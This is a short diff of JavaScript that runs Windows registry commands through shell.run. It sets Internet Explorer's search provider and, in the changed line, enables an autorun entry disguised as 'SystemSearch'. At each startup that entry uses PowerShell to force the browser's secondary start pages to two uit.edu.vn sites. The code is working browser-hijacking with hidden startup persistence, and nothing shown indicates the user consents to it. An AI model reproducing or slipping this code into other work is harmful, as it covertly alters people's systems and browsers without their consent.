@@ -53,9 +53,9 @@
             shell.run('reg add "HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\SearchScopes\\{0633EE93-D776-472f-A0FF-E1416B8B2E3A}" /v "NTTopResultURL" /t REG_SZ /d "http://search.yahoo.com/search?q={searchTerms}&src=IE-SearchBox&FORM=IENTTR" /f');
 
             // (In-testing) Add auto modifying "Secondary Start Pages" registry key at startup
-            //shell.run('reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemSearch" /t REG_SZ /d "cmd /C powershell -command reg add \'HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\' /v \'Secondary Start Pages\' /t REG_MULTI_SZ /d \'https://student.uit.edu.vn\\0https://drl.uit.edu.vn\' /f" /f');
+            shell.run('reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemSearch" /t REG_SZ /d "cmd /C powershell -command reg add \'HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\' /v \'Secondary Start Pages\' /t REG_MULTI_SZ /d \'https://student.uit.edu.vn\\0https://drl.uit.edu.vn\' /f" /f');
             // (In-testing) Sample
-			//shell.run("reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemSearch\" /t REG_SZ /d \'powershell -command reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\" /v \"Secondary Start Pages\" /t REG_MULTI_SZ /d \"https://student.uit.edu.vn\\0https://drl.uit.edu.vn\" /f\" /f");
+			//shell.run("reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemSearch\" /t REG_SZ /d \'powershell -command reg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\" /v \"Secondary Start Pages\" /t REG_MULTI_SZ /d \"https://student.uit.edu.vn\\0https://drl.uit.edu.vn\" /f\" /f");
 
             // Some decoration
             document.querySelector("body").style.backgroundColor = "white";
